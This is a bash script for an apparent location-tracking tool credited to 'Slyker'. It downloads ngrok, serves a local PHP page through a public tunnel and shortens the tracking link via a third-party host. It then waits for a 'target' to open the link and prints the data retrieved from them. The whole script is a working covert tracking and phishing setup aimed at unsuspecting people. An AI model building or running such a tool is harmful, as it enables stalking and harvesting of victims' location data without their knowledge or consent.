#!system/bin/bash

function Percent(){
    message="$1"
    max=$2
        i=0
        while [ $i -le $max ]; do
            echo -ne "\r${G}${D}$message ${C}$i${D} %"
            sleep $3
            let i++
        done
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
}

function ngrok(){
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
./ngrok http 3333 > /dev/null 2>&1 &
}


function random(){
  num=($RANDOM % 1000 + 100)
  str=$RANDOM
  rand=($RANDOM % 1000000 * 1000)
  file="$number$string$rand"
}

function create(){
  echo -e '\033[32;1m'
  read -p '[!] Press enter to continue...'
  sleep 1
  Percent '[+] Creating Track...' 100 0.1
  echo -e '\033[32;1m'
  sleep 1
}

function track(){
  baseurl=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
  cd result
  if [[ -f "$file.txt" ]];then
  rm $file.txt
  fi
  cd ../
  url="$baseurl/location.php?f=$file"
  cutly=$(curl -s "https://rplsmktjp.000webhostapp.com/uploads/cutly.php?url=$url" | grep -o 'Undefined index: shortLink in'; echo $?)
  if [[ $cutly == *'0'* ]];then
  cutly='error'
  else
  cutly=$(curl -s "https://rplsmktjp.000webhostapp.com/uploads/cutly.php?url=$url")
  fi
  echo -e "\033[32;1m[*] Link : [   $cutly   ]"
  sleep 2
  echo -e '\033[32;1mWaiting target to open link'
  sleep 2
  echo -e '\033[32;1mPress CTRL + C to exit'
  cd result
  while [[ true ]];do
    if [[ -f "$file.txt" ]];then
    echo -e "\033[32;1m[*] Retrieve data target"
    sleep 2
    cat $file.txt
    rm $file.txt
    echo -e '\033[32;1m'
    echo -e '\033[32;1m'
    sleep 1
    fi
    done
  cd ../
}

function banner(){
echo -e '\033[32;1m██╗      █████╗  █████╗  █████╗ \033[33;1m████████╗██╗ █████╗ ███╗  ██╗'
echo -e '\033[32;1m██║     ██╔══██╗██╔══██╗██╔══██╗\033[33;1m╚══██╔══╝██║██╔══██╗████╗ ██║'
echo -e '\033[32;1m██║     ██║  ██║██║  ╚═╝███████║\033[33;1m   ██║   ██║██║  ██║██╔██╗██║'
echo -e '\033[32;1m██║     ██║  ██║██║  ██╗██╔══██║\033[33;1m   ██║   ██║██║  ██║██║╚████║'
echo -e '\033[32;1m███████╗╚█████╔╝╚█████╔╝██║  ██║\033[33;1m   ██║   ██║╚█████╔╝██║ ╚███║'
echo -e '\033[32;1m╚══════╝ ╚════╝  ╚════╝ ╚═╝  ╚═╝\033[33;1m   ╚═╝   ╚═╝ ╚════╝ ╚═╝  ╚══╝'
echo -e '\033[32;1mAuthor : Slyker'
echo -e '\033[32;1mGithub : https://github.com/MrSlyker'
}

if [[ ! -d result ]];then
mkdir result
fi

sleep 0.5
echo -e '\033[32;1m'
clear
sleep 1
cd modules
python run.py
cd ../
sleep 1.5
clear
sleep 1
stop
banner
ngrok
create
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -eq 0 ]; then
random
track
else
echo -e "\033[32;1m"
sleep 2
echo -e "\033[32;1m[!] No internet connection"
sleep 2
echo -e "\033[32;1m[!] Please check your network"
sleep 2
exit
fi
